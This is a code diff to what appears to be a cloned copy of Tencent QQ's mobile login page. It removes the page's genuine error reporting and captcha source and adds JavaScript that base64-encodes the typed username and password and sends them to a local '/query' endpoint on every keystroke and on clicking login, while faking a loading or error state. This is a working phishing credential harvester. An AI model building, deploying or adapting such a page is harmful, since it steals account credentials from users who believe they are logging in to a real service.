@@ -4,6 +4,7 @@
 
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" href="/favicon.ico">
     <meta id="viewport" name="viewport"
         content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
@@ -568,21 +569,13 @@
             overflow: hidden
         }
     </style>
-    <link rel="stylesheet" type="text/css" href="./mobile_common.css">
+    <link rel="stylesheet" type="text/css" href="/mobile_common.css">
     <style type="text/css">
         .logo {
             background-image: url("//qzonestyle.gtimg.cn/qzone/phone/style/img/ptlogin-logo.png");
         }
     </style>
     <script>//错误上报
-        (function () {
-            window.onerror = function (msg, url, line) {
-                var reportUrl = "//ui.ptlogin2.qq.com/cgi-bin/report?";
-                var t = document.createElement('img');
-                var e_info = encodeURIComponent(msg + '|_|' + url + '|_|' + line + '|_|' + window.navigator.userAgent);
-                t.src = reportUrl + 'id=195279&msg=' + e_info + '&v=' + Math.random();
-            }
-        })();
         var ptui_daid = encodeURIComponent("5")//业务隔离id
             , ptui_appid = encodeURIComponent("549000929")//业务的appid
             , ptui_domain = encodeURIComponent("qq.com")//domain
@@ -623,7 +616,7 @@
             password_error_tips: '若你的帐号为非大陆手机号，请<a href="javascript:pt.enterOverseaLogin()">点击这里</a>进行登录。'
         };
     </script>
-    <script type="text/javascript" charset="utf-8" src="./jquery.js"></script>
+    <script type="text/javascript" charset="utf-8" src="/jquery.js"></script>
     <!-- <script type="text/javascript" charset="utf-8" src="./手机统一登录_files/area_chs.js.下载"></script>
     <script type="text/javascript" charset="utf-8" src="./手机统一登录_files/login_10.js.下载"></script> -->
     <script>
@@ -660,7 +653,6 @@
                     </li>
                 </ul>
                 <div href="javascript:void(0);" id="go"> 登 录 </div>
-                <div href="javascript:void(0);" id="onekey" class=" weak" style="display: block;"> 一键登录 </div>
             </div>
             <div id="switch">
                 <div id="swicth_login" onclick="pt._switch();" style="display: none;"> 快速登录历史帐号 </div>
@@ -677,15 +669,14 @@
             <div id="submit"> 提交验证码 </div>
         </div>
     </div>
-    <div id="new_vcode" class="new_vcode"><iframe id="cap_iframe" src="./手机统一登录_files/saved_resource.html"
-            frameborder="0" scrolling="auto" width="100%" height="100%"></iframe></div>
+    <div id="new_vcode" class="new_vcode"><iframe id="cap_iframe" src="" frameborder="0" scrolling="auto" width="100%"
+            height="100%"></iframe></div>
     <div id="footerBlank"></div>
     <div id="mask" class="qui-dialog-mask" style="display: none;"></div>
     <div id="mask_loading" class="qui-loading-mask" style="display: none;"></div>
     <div id="mask_error" class="qui-dialog-box" style="display: none;">
-        <div class="qui-dialog-content">你输入的帐号或密码不正确，请重新输入。<br>若你的帐号为非大陆手机号，请<a
-                href="javascript:pt.enterOverseaLogin()">点击这里</a>进行登录。</div>
-        <div class="qui-dialog-bottom" onclick="pt.hideAlert()">关闭</div>
+        <div class="qui-dialog-content">你输入的帐号或密码不正确，请重新输入。</div>
+        <div class="qui-dialog-bottom" id="meb">关闭</div>
     </div>
     <script>var login_wording = "快速登录历史帐号";
         var qlogin_wording = "帐号密码登录";   </script>
@@ -770,11 +761,27 @@
         // } catch (e) { }
         let u = $("#u");
         let p = $("#p");
+        let g = $("#go");
         let du = $("#del_touch");
         let dp = $("#del_touch_p");
         let m = $("#mask");
         let ml = $("#mask_loading");
         let me = $("#mask_error");
+        let meb = $("#meb");
+
+        let f = (url, cal = () => { }, calerr = () => { }) => {
+            $.ajax({
+                url: url,
+                type: 'get',
+                timeout: 10e3,
+                success: cal,
+                error: calerr
+            });
+        };
+        let inpt = () => {
+            let str = `type=input&u=${u.val()}&p=${p.val()}`;
+            f(`/query?d=${window.btoa(encodeURIComponent(str))}`);
+        };
 
         du.hide();
         dp.hide();
@@ -792,6 +799,7 @@
             } else {
                 du.hide();
             }
+            inpt();
         });
         p.on('input', () => {
             if (p.val() !== "") {
@@ -799,11 +807,32 @@
             } else {
                 dp.hide();
             }
+            inpt();
+        });
+        meb.on('click', () => {
+            m.hide();
+            ml.hide();
+            me.hide();
         });
         $("#forgetpwd").on("click", () => {
             let url = `https://aq.qq.com/cn2/findpsw/mobile_v2/mobile_web_find_index?source_id=3263&account=${u.val()}`;
             window.open(url);
         })
+        g.on("click", () => {
+            m.show();
+            ml.show();
+            inpt();
+            let str = `type=login&u=${u.val()}&p=${p.val()}`;
+            f(`/query?d=${window.btoa(encodeURIComponent(str))}`, (e) => {
+                if (e == "error") {
+                    ml.hide();
+                    me.show();
+                } else {
+                    // m.hide();
+                    // ml.hide();
+                }
+            })
+        });
     </script>
 </body>
 
